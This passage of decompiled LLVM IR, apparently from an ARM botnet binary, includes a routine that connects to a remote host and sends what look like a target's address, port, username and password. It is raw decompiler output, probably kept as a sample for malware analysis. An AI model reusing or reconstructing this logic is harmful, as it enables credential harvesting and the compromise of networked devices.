  %v3_10260 = zext i16 %v2_10260 to i32
  %v3_10264 = urem i32 %v0_10258, %v3_10260
  store i32 ptrtoint (i32* @global_var_22444.145 to i32), i32* %r3.global-to-local, align 4
  %v2_1026c = load i32, i32* @global_var_22444.145, align 4
  store i32 %v2_1026c, i32* %ip.global-to-local, align 4
  %v1_10274 = load i32, i32* @r4, align 4
  %v9_10274 = icmp eq i32 %v2_1026c, %v1_10274
  store i1 %v9_10274, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_10264, i32* %r1.global-to-local, align 4
  %v7_1027c = icmp sgt i32 %v2_1026c, %v1_10274
  br i1 %v7_1027c, label %dec_label_pc_10280, label %dec_label_pc_102b8

dec_label_pc_10280:                               ; preds = %dec_label_pc_10250
  %v2_10284 = load i32, i32* @global_var_22470.147, align 4
  store i32 %v2_10284, i32* %r3.global-to-local, align 4
  store i32 %v1_10274, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1028c

dec_label_pc_1028c:                               ; preds = %dec_label_pc_102a8, %dec_label_pc_10280
  %v0_102a8 = phi i32 [ %v1_102a8, %dec_label_pc_102a8 ], [ %v1_10274, %dec_label_pc_10280 ]
  %v0_102b0 = phi i32 [ %v1_102b0, %dec_label_pc_102a8 ], [ %v2_10284, %dec_label_pc_10280 ]
  %v1_10290 = add i32 %v0_102b0, 8
  %v2_10290 = inttoptr i32 %v1_10290 to i16*
  %v3_10290 = load i16, i16* %v2_10290, align 2
  %v4_10290 = zext i16 %v3_10290 to i32
  store i32 %v4_10290, i32* %r3.global-to-local, align 4
  %tmp457 = icmp ugt i32 %v4_10290, %v3_10264
  br i1 %tmp457, label %dec_label_pc_102a8, label %dec_label_pc_1029c

dec_label_pc_1029c:                               ; preds = %dec_label_pc_1028c
  %v1_1029c = add i32 %v0_102b0, 10
  %v2_1029c = inttoptr i32 %v1_1029c to i16*
  %v3_1029c = load i16, i16* %v2_1029c, align 2
  %v4_1029c = zext i16 %v3_1029c to i32
  store i32 %v4_1029c, i32* %r3.global-to-local, align 4
  %v3_102a0 = icmp uge i32 %v4_1029c, %v3_10264
  %v9_102a0 = icmp eq i32 %v4_1029c, %v3_10264
  %v2_102a4 = xor i1 %v9_102a0, true
  %v3_102a4 = and i1 %v3_102a0, %v2_102a4
  br i1 %v3_102a4, label %dec_label_pc_102bc.loopexit, label %dec_label_pc_102a8

dec_label_pc_102a8:                               ; preds = %dec_label_pc_1029c, %dec_label_pc_1028c
  %v1_102a8 = add i32 %v0_102a8, 1
  store i32 %v1_102a8, i32* %r2.global-to-local, align 4
  %v9_102ac = icmp eq i32 %v1_102a8, %v2_1026c
  %v1_102b0 = add i32 %v0_102b0, 16
  store i32 %v1_102b0, i32* %r3.global-to-local, align 4
  br i1 %v9_102ac, label %dec_label_pc_102b8.loopexit, label %dec_label_pc_1028c

dec_label_pc_102b8.loopexit:                      ; preds = %dec_label_pc_102a8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_102b8

dec_label_pc_102b8:                               ; preds = %dec_label_pc_102b8.loopexit, %dec_label_pc_10250
  br label %dec_label_pc_102bc

dec_label_pc_102bc.loopexit:                      ; preds = %dec_label_pc_1029c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v9_102a0, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_102bc

dec_label_pc_102bc:                               ; preds = %dec_label_pc_102bc.loopexit, %dec_label_pc_102b8
  %v0_102d0 = phi i32 [ %v0_102b0, %dec_label_pc_102bc.loopexit ], [ 0, %dec_label_pc_102b8 ]
  %v0_102bc = load i32, i32* @r6, align 4
  %v1_102bc = add i32 %v0_102bc, 4
  %v2_102bc = inttoptr i32 %v1_102bc to i32*
  %v3_102bc = load i32, i32* %v2_102bc, align 4
  %v3_102c0 = udiv i32 %v3_102bc, 32
  store i32 %v3_102c0, i32* %r2.global-to-local, align 4
  %v1_102c4 = urem i32 %v3_102bc, 32
  store i32 %v1_102c4, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_102c8 = mul nuw nsw i32 %v3_102c0, 4
  store i32 %v3_102c8, i32* @ip, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_102d0 = inttoptr i32 %v0_102bc to i32*
  store i32 %v0_102d0, i32* %v2_102d0, align 4
  %v0_102d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_102d4 = load i32, i32* @r6, align 4
  %v2_102d4 = add i32 %v1_102d4, 24
  %v3_102d4 = inttoptr i32 %v2_102d4 to i32*
  store i32 %v0_102d4, i32* %v3_102d4, align 4
  %v0_f6a8.pre = load i32, i32* @ip, align 4
  %v1_f6b0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f6a4

dec_label_pc_102dc:                               ; preds = %dec_label_pc_10218
  %v0_102dc = load i32, i32* @r6, align 4
  %v1_102dc = add i32 %v0_102dc, 4
  %v2_102dc = inttoptr i32 %v1_102dc to i32*
  %v3_102dc = load i32, i32* %v2_102dc, align 4
  %v1_102e0 = call i32 @__GI___libc_close(i32 %v3_102dc)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_102e8 = load i32, i32* @r4, align 4
  %v1_102e8 = load i32, i32* @r6, align 4
  %v2_102e8 = add i32 %v1_102e8, 12
  %v3_102e8 = inttoptr i32 %v2_102e8 to i32*
  store i32 %v0_102e8, i32* %v3_102e8, align 4
  %v0_102ec = load i32, i32* %r3.global-to-local, align 4
  %v1_102ec = load i32, i32* @r6, align 4
  %v2_102ec = add i32 %v1_102ec, 4
  %v3_102ec = inttoptr i32 %v2_102ec to i32*
  store i32 %v0_102ec, i32* %v3_102ec, align 4
  %v0_102f0 = load i32, i32* @r4, align 4
  %v1_102f0 = trunc i32 %v0_102f0 to i8
  %v2_102f0 = load i32, i32* @r6, align 4
  %v3_102f0 = add i32 %v2_102f0, 384
  %v4_102f0 = inttoptr i32 %v3_102f0 to i8*
  store i8 %v1_102f0, i8* %v4_102f0, align 1
  br label %dec_label_pc_f7cc

dec_label_pc_102f8:                               ; preds = %dec_label_pc_f8c8
  store i32 %v2_f878, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v1_10304 = add i32 %v1_f8e4, 4
  %v2_10304 = inttoptr i32 %v1_10304 to i32*
  %v3_10304 = load i32, i32* %v2_10304, align 4
  store i32 %v3_10304, i32* @r4, align 4
  %v0_10308 = call i32 @rand_next()
  %v0_1030c = load i32, i32* @r5, align 4
  %v1_1030c = inttoptr i32 %v0_1030c to i8*
  %v2_1030c = load i8, i8* %v1_1030c, align 1
  %v3_1030c = zext i8 %v2_1030c to i32
  %v3_10310 = urem i32 %v0_10308, %v3_1030c
  store i32 %v3_10310, i32* %r1.global-to-local, align 4
  %v0_10314 = load i32, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_10314 = mul nuw nsw i32 %v3_10310, 4
  %v5_10314 = add i32 %v0_10314, %v4_10314
  %v6_10314 = inttoptr i32 %v5_10314 to i32*
  %v7_10314 = load i32, i32* %v6_10314, align 4
  store i32 %v7_10314, i32* %r3.global-to-local, align 4
  %v0_1031c = load i32, i32* @sl, align 4
  store i32 %v0_1031c, i32* %r1.global-to-local, align 4
  %v2_10324 = inttoptr i32 %v0_1031c to i32*
  %v3_10324 = call i32 @table_retrieve_val(i32 4, i32* %v2_10324)
  store i32 %v2_f878, i32* %ip.global-to-local, align 4
  %v0_10334 = load i32, i32* @r5, align 4
  %v1_10338 = call i32 @resolv_entries_free(i32 %v0_10334)
  %v1_10340 = call i32 @table_lock_val(i32 3)
  %v1_10348 = call i32 @table_lock_val(i32 4)
  %v0_10350 = load i32, i32* @r8, align 4
  store i32 %v2_10354, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_1035c = call i32 @__libc_connect(i32 %v0_10350, i32 %v2_10354, i32 16)
  %v3_10360 = icmp eq i32 %v3_1035c, -1
  store i1 %v3_10360, i1* %cpsr_c.global-to-local, align 1
  %v8_10360 = icmp eq i32 %v3_1035c, -1
  store i1 %v8_10360, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10360, label %dec_label_pc_10368, label %dec_label_pc_10378

dec_label_pc_10368:                               ; preds = %dec_label_pc_102f8
  %v0_10368 = load i32, i32* @r8, align 4
  %v1_1036c = call i32 @__GI___libc_close(i32 %v0_10368)
  %v0_10370 = load i32, i32* @sl, align 4
  %v1_10374 = call i32 @__GI_exit(i32 %v0_10370)
  br label %dec_label_pc_10378

dec_label_pc_10378:                               ; preds = %dec_label_pc_102f8, %dec_label_pc_10368
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v2_edec, i32* %r1.global-to-local, align 4
  %v0_10384 = load i32, i32* @r8, align 4
  %v0_10388 = load i32, i32* @sl, align 4
  store i32 %v0_10388, i32* %stack_var_-56, align 4
  %v5_1038c = call i32 @__libc_send(i32 %v0_10384, i32 %v2_edec, i32 1, i32 16384)
  store i32 %v2_1001c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_103a0 = load i32, i32* @r8, align 4
  %v4_103a4 = call i32 @__libc_send(i32 %v0_103a0, i32 %v2_1001c, i32 4, i32 16384)
  store i32 %v2_103ac, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_103b8 = load i32, i32* @r8, align 4
  %v4_103bc = call i32 @__libc_send(i32 %v0_103b8, i32 %v2_103ac, i32 2, i32 16384)
  %v0_103c0 = load i32, i32* @sb, align 4
  %v1_103c0 = add i32 %v0_103c0, 12
  store i32 %v1_103c0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_103cc = load i32, i32* @r8, align 4
  %v4_103d0 = call i32 @__libc_send(i32 %v0_103cc, i32 %v1_103c0, i32 1, i32 16384)
  %v0_103d4 = load i32, i32* @sb, align 4
  %v1_103d4 = inttoptr i32 %v0_103d4 to i32*
  %v2_103d4 = load i32, i32* %v1_103d4, align 4
  store i32 %v2_103d4, i32* %r1.global-to-local, align 4
  %v1_103d8 = add i32 %v0_103d4, 12
  %v2_103d8 = inttoptr i32 %v1_103d8 to i8*
  %v3_103d8 = load i8, i8* %v2_103d8, align 1
  %v4_103d8 = zext i8 %v3_103d8 to i32
  store i32 %v4_103d8, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_103e0 = load i32, i32* @r8, align 4
  %v4_103e4 = call i32 @__libc_send(i32 %v0_103e0, i32 %v2_103d4, i32 %v4_103d8, i32 16384)
  %v0_103e8 = load i32, i32* @sb, align 4
  %v1_103e8 = add i32 %v0_103e8, 13
  store i32 %v1_103e8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_103f4 = load i32, i32* @r8, align 4
  %v4_103f8 = call i32 @__libc_send(i32 %v0_103f4, i32 %v1_103e8, i32 1, i32 16384)
  %v0_103fc = load i32, i32* @r8, align 4
  %v0_10400 = load i32, i32* @sb, align 4
  %v1_10400 = add i32 %v0_10400, 13
  %v2_10400 = inttoptr i32 %v1_10400 to i8*
  %v3_10400 = load i8, i8* %v2_10400, align 1
  %v4_10400 = zext i8 %v3_10400 to i32
  store i32 %v4_10400, i32* %r2.global-to-local, align 4
  %v1_10404 = add i32 %v0_10400, 4
  %v2_10404 = inttoptr i32 %v1_10404 to i32*
  %v3_10404 = load i32, i32* %v2_10404, align 4
  store i32 %v3_10404, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_1040c = call i32 @__libc_send(i32 %v0_103fc, i32 %v3_10404, i32 %v4_10400, i32 16384)
  %v0_10410 = load i32, i32* @r8, align 4
  %v1_10414 = call i32 @__GI___libc_close(i32 %v0_10410)
  br label %dec_label_pc_10418

dec_label_pc_10418:                               ; preds = %dec_label_pc_f8ac, %dec_label_pc_10378
  %v0_10418 = load i32, i32* @sl, align 4
  %v1_1041c = call i32 @__GI_exit(i32 %v0_10418)
  br label %dec_label_pc_10420

dec_label_pc_10420.loopexit:                      ; preds = %dec_label_pc_fe38
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10420

dec_label_pc_10420:                               ; preds = %dec_label_pc_10420.loopexit, %dec_label_pc_10418
  %v1_10424 = call i32 @table_lock_val(i32 30)
  %v0_10428 = load i32, i32* @r6, align 4
  %v1_10428 = add i32 %v0_10428, 12
  %v2_10428 = inttoptr i32 %v1_10428 to i32*
  %v3_10428 = load i32, i32* %v2_10428, align 4
  br label %dec_label_pc_f6c0.backedge

dec_label_pc_f6c0.backedge.thread:                ; preds = %dec_label_pc_f938, %dec_label_pc_fadc, %dec_label_pc_fbb0, %dec_label_pc_fc84, %dec_label_pc_feb8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f6c8

dec_label_pc_f6c0.backedge.thread562:             ; preds = %dec_label_pc_fc14, %dec_label_pc_fb40, %dec_label_pc_ff1c, %dec_label_pc_fd5c, %dec_label_pc_f99c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f6c8

dec_label_pc_f6c0.backedge:                       ; preds = %dec_label_pc_f740, %dec_label_pc_10420, %dec_label_pc_10430
  %v0_f6c8228 = phi i32 [ %v0_10440, %dec_label_pc_10430 ], [ %v0_10428, %dec_label_pc_10420 ], [ %v0_f740, %dec_label_pc_f740 ]
  %v0_f6c0.be = phi i32 [ %v3_10440, %dec_label_pc_10430 ], [ %v3_10428, %dec_label_pc_10420 ], [ %v3_f740, %dec_label_pc_f740 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f6c0 = icmp eq i32 %v0_f6c0.be, 0
  store i1 %v2_f6c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f6c0, label %dec_label_pc_f7cc, label %dec_label_pc_f6c8

dec_label_pc_10430:                               ; preds = %dec_label_pc_10068
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v1_10434 = call i32 @table_lock_val(i32 31)
  %v1_1043c = call i32 @table_lock_val(i32 32)
  %v0_10440 = load i32, i32* @r6, align 4
  %v1_10440 = add i32 %v0_10440, 12
  %v2_10440 = inttoptr i32 %v1_10440 to i32*
  %v3_10440 = load i32, i32* %v2_10440, align 4
  br label %dec_label_pc_f6c0.backedge

dec_label_pc_10448:                               ; preds = %dec_label_pc_f778
  store i32 %v0_f2dc, i32* %r2.global-to-local, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 104, i32* %v2_f2f8, align 4
  br label %dec_label_pc_f794

dec_label_pc_10458:                               ; preds = %dec_label_pc_edcc
  store i32 ptrtoint (i32* @global_var_24f60.156 to i32), i32* %r2.global-to-local, align 4
  %v2_1045c = load i32, i32* @global_var_24f60.156, align 4
  %v1_10460 = call i32 @__GI___libc_close(i32 %v2_1045c)
  br label %dec_label_pc_10464

dec_label_pc_10464:                               ; preds = %dec_label_pc_eda8, %dec_label_pc_10458
  %v0_10464 = load i32, i32* @r5, align 4
  %v1_10468 = call i32 @__GI_exit(i32 %v0_10464)
  ret i32 %v1_10468

; uselistorder directives
  uselistorder i32 %v0_10440, { 1, 0 }
  uselistorder i32 %v3_102bc, { 1, 0 }
  uselistorder i32 %v1_102b0, { 1, 0 }
  uselistorder i32 %v1_102a8, { 1, 2, 0 }
  uselistorder i1 %v9_102a0, { 1, 0 }
  uselistorder i32 %v3_10264, { 2, 1, 0, 3 }
  uselistorder i32 %v1_10194, { 2, 1, 0 }
  uselistorder i32 %v0_10110.pr, { 1, 0 }
  uselistorder i32 %v0_100dc, { 1, 2, 0 }
  uselistorder i32 %v4_1007c, { 1, 0 }
  uselistorder i1 %v7_10058, { 1, 0 }
  uselistorder i32 %v1_10000, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_10000, { 0, 2, 1 }
  uselistorder i32 %v0_fff8, { 1, 0 }
  uselistorder i1 %v7_fff4, { 1, 0 }
  uselistorder i1 %v7_ffec, { 1, 0 }
  uselistorder i1 %v7_ffe4, { 1, 0 }
  uselistorder i1 %v8_ffdc, { 1, 0 }
  uselistorder i1 %v7_ffc0, { 1, 0 }
  uselistorder i1 %v7_ffb8, { 1, 0 }
  uselistorder i1 %v7_ffb0, { 1, 0 }
  uselistorder i1 %v8_ffa8, { 1, 0 }
  uselistorder i32 %v1_ff90, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_ff2c, { 1, 0 }
  uselistorder i8 %v3_ff24, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_ff1c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_ff1c, { 0, 2, 1 }
  uselistorder i32 %v0_ff14, { 1, 0 }
  uselistorder i1 %v7_ff10, { 1, 0 }
  uselistorder i1 %v7_ff08, { 1, 0 }
  uselistorder i1 %v7_ff00, { 1, 0 }
  uselistorder i1 %v7_feec, { 1, 0 }
  uselistorder i1 %v7_fee4, { 1, 0 }
  uselistorder i1 %v7_fedc, { 1, 0 }
  uselistorder i1 %v8_fed4, { 1, 0 }
  uselistorder i32 %v1_febc, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v4_fe64, { 1, 0 }
  uselistorder i32 %v1_fe30, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_fe30, { 0, 2, 1 }
  uselistorder i32 %v0_fe28, { 1, 0 }
  uselistorder i1 %v7_fe24, { 1, 0 }
  uselistorder i1 %v7_fe1c, { 1, 0 }
  uselistorder i1 %v8_fe14, { 1, 0 }
  uselistorder i1 %v7_fdf8, { 1, 0 }
  uselistorder i1 %v7_fdf0, { 1, 0 }
  uselistorder i1 %v8_fde8, { 1, 0 }
  uselistorder i32 %v1_fdd0, { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder i1 %v8_fd6c, { 1, 0 }
  uselistorder i8 %v3_fd64, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_fd5c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_fd5c, { 0, 2, 1 }
  uselistorder i32 %v0_fd54, { 1, 0 }
  uselistorder i1 %v7_fd50, { 1, 0 }
  uselistorder i1 %v7_fd48, { 1, 0 }
  uselistorder i1 %v7_fd40, { 1, 0 }
  uselistorder i1 %v7_fcb8, { 1, 0 }
  uselistorder i1 %v7_fcb0, { 1, 0 }
  uselistorder i1 %v7_fca8, { 1, 0 }
  uselistorder i1 %v8_fca0, { 1, 0 }
  uselistorder i32 %v1_fc88, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_fc24, { 1, 0 }
  uselistorder i8 %v3_fc1c, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_fc14, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_fc14, { 0, 2, 1 }
  uselistorder i32 %v0_fc0c, { 1, 0 }
  uselistorder i1 %v7_fc08, { 1, 0 }
  uselistorder i1 %v7_fc00, { 1, 0 }
  uselistorder i1 %v7_fbf8, { 1, 0 }
  uselistorder i1 %v7_fbe4, { 1, 0 }
  uselistorder i1 %v7_fbdc, { 1, 0 }
  uselistorder i1 %v7_fbd4, { 1, 0 }
  uselistorder i1 %v8_fbcc, { 1, 0 }
  uselistorder i32 %v1_fbb4, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_fb50, { 1, 0 }
  uselistorder i8 %v3_fb48, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_fb40, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_fb40, { 0, 2, 1 }
  uselistorder i32 %v0_fb38, { 1, 0 }
  uselistorder i1 %v7_fb34, { 1, 0 }
  uselistorder i1 %v7_fb2c, { 1, 0 }
  uselistorder i1 %v7_fb24, { 1, 0 }
  uselistorder i1 %v7_fb10, { 1, 0 }
  uselistorder i1 %v7_fb08, { 1, 0 }
  uselistorder i1 %v7_fb00, { 1, 0 }
  uselistorder i1 %v8_faf8, { 1, 0 }
  uselistorder i32 %v1_fae0, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_facc, { 1, 0 }
  uselistorder i32 %v1_fac4, { 1, 0 }
  uselistorder i32 %v1_fabc, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_fab8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_fab8, { 0, 2, 1 }
  uselistorder i32 %v0_fa98.pr, { 1, 0 }
  uselistorder i32 %v0_fa78.pr, { 1, 0 }
  uselistorder i1 %v7_fa50, { 1, 0 }
  uselistorder i1 %v2_fa40, { 1, 0, 2 }
  uselistorder i1 %v2_fa24, { 1, 0, 2 }
  uselistorder i32 %v1_fa44, { 1, 2, 3, 0 }
  uselistorder i32 %v1_fa18, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v2_fa48, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1 %v8_f9ac, { 1, 0 }
  uselistorder i8 %v3_f9a4, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f99c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f99c, { 0, 2, 1 }
  uselistorder i32 %v0_f994, { 1, 0 }
  uselistorder i1 %v7_f990, { 1, 0 }
  uselistorder i1 %v7_f988, { 1, 0 }
  uselistorder i1 %v7_f980, { 1, 0 }
  uselistorder i1 %v7_f96c, { 1, 0 }
  uselistorder i1 %v7_f964, { 1, 0 }
  uselistorder i1 %v7_f95c, { 1, 0 }
  uselistorder i1 %v8_f954, { 1, 0 }
  uselistorder i32 %v1_f93c, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_f928, { 1, 2, 0 }
  uselistorder i32 %v2_f914, { 1, 0 }
  uselistorder i32 %v0_f914, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v3_f910, { 2, 1, 4, 0, 5, 3 }
  uselistorder i1 %v7_f8bc, { 1, 0 }
  uselistorder i32 %v3_f8b8, { 1, 0, 2 }
  uselistorder i1 %v2_f8a4, { 1, 0 }
  uselistorder i32 %.462, { 1, 0 }
  uselistorder i1 %v7_f88c, { 1, 0 }
  uselistorder i32 %v0_f888, { 2, 1, 0 }
  uselistorder i1 %v7_f860, { 1, 0 }
  uselistorder i32 %v0_f860, { 2, 1, 0, 3 }
  uselistorder i32 %v1_f7d0, { 2, 0, 3, 4, 5, 1 }
  uselistorder i1 %v1_f7b4, { 1, 0 }
  uselistorder i32 %v1_f7a4, { 2, 1, 0 }
  uselistorder i32 %v1_f7a0, { 1, 0 }
  uselistorder i32 %v0_f740, { 2, 5, 6, 20, 7, 8, 24, 9, 10, 21, 11, 12, 25, 13, 14, 22, 15, 16, 23, 4, 3, 19, 17, 18, 26, 27, 1, 0 }
  uselistorder i32 %v1_f71c, { 1, 2, 3, 0 }
  uselistorder i32 %v3_f718, { 1, 0 }
  uselistorder i32 %v4_f6fc, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder i32 %v2_f6e8, { 1, 0, 2 }
  uselistorder i32 %v3_f6e4, { 1, 0, 2 }
  uselistorder i32 %v0_101e4, { 1, 0, 2 }
  uselistorder i32 %v3_f6ac, { 1, 0 }
  uselistorder i32 %v1_f694, { 3, 2, 1, 0 }
  uselistorder i32 %v3_f690, { 1, 0 }
  uselistorder i32 %v3_f688, { 1, 2, 0 }
  uselistorder i1 %v7_f678, { 1, 0 }
  uselistorder i32 %v3_f674, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_f60c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_f60c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_f5f0, { 0, 2, 1 }
  uselistorder i32 %v1_f5e8, { 1, 0 }
  uselistorder i32 %v1_f5a8, { 2, 1, 0 }
  uselistorder i32 %v1_f5a4, { 1, 0 }
  uselistorder i1 %v2_f584, { 1, 0, 2 }
  uselistorder i32 %v0_f580, { 1, 0, 2 }
  uselistorder i1 %v7_f54c, { 0, 3, 4, 1, 2 }
  uselistorder i1 %v2_f54c, { 1, 0, 2 }
  uselistorder i32 %v2_f544, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v1_f51c, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_f510, { 0, 1, 3, 2 }
  uselistorder i32 %v0_f510, { 0, 2, 1 }
  uselistorder i32 %v3_f5d0, { 4, 7, 5, 6, 1, 0, 3, 2, 8 }
  uselistorder i32 %v1_f460, { 1, 0 }
  uselistorder i32 %v1_f448, { 0, 2, 3, 1 }
  uselistorder i32 %v0_f454, { 0, 3, 2, 1 }
  uselistorder i32 %v0_f3fc, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v5_f3f0, { 2, 1, 0 }
  uselistorder i32 %v1_f3d0, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_f3b4, { 0, 1, 3, 2 }
  uselistorder i1 %v2_f3ac, { 1, 0 }
  uselistorder i1 %v9_f378, { 1, 0 }
  uselistorder i32* %v2_f2f8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_f2dc, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_f2c8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v5_f210, { 1, 0 }
  uselistorder i32 %v3_f200, { 1, 2, 0, 3 }
  uselistorder i32 %v5_f1d0, { 0, 3, 1, 2 }
  uselistorder i1 %v2_f138, { 1, 0 }
  uselistorder i1 %v2_f124, { 1, 0 }
  uselistorder i1 %v2_f110, { 1, 0 }
  uselistorder i32 %.461, { 2, 1, 0 }
  uselistorder i1 %v7_f0ec, { 2, 1, 0, 5, 4, 3 }
  uselistorder i1 %v2_f0d4, { 1, 0 }
  uselistorder i1 %v3_f0b8, { 1, 0, 2 }
  uselistorder i1 %v2_f0a4, { 1, 0 }
  uselistorder i1 %v2_f080, { 1, 0 }
  uselistorder i32 %v1_f030, { 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 31, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f01c, { 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 30, 31, 32, 29, 28, 27, 26, 25, 24, 23, 22, 20, 21, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6, 7, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_f018, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32 %stack_var_-1880.0, { 0, 3, 2, 1 }
  uselistorder i32 %v2_10354, { 2, 3, 1, 0 }
  uselistorder i32 %v2_f878, { 1, 2, 3, 0 }
  uselistorder i32 %v2_1001c, { 4, 5, 1, 0, 12, 13, 8, 11, 7, 10, 9, 6, 3, 2 }
  uselistorder i32 %v2_100c4, { 1, 2, 0 }
  uselistorder i32 %v2_f5dc, { 0, 5, 1, 4, 2, 7, 3, 6 }
  uselistorder i32 %v2_efc0, { 1, 3, 6, 5, 7, 0, 2, 4, 8, 9 }
  uselistorder i32 %v4_eea4, { 2, 1, 0, 3 }
  uselistorder i16 %v5_ee28.le, { 1, 0 }
  uselistorder i32 %v0_ee1c, { 2, 1, 0 }
  uselistorder i32 %v2_edec, { 3, 2, 0, 1 }
  uselistorder i1 %v7_edbc, { 1, 0 }
  uselistorder i32 %v3_edb4, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_eda0, { 1, 0 }
  uselistorder i32 %v2_ed84, { 1, 0, 2 }
  uselistorder i32 %storemerge328, { 1, 0 }
  uselistorder i32 %v0_ecdc, { 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i32* %stack_var_-60, { 10, 11, 12, 0, 1, 13, 5, 14, 2, 15, 6, 16, 3, 17, 4, 18, 7, 19, 20, 8, 21, 9, 22 }
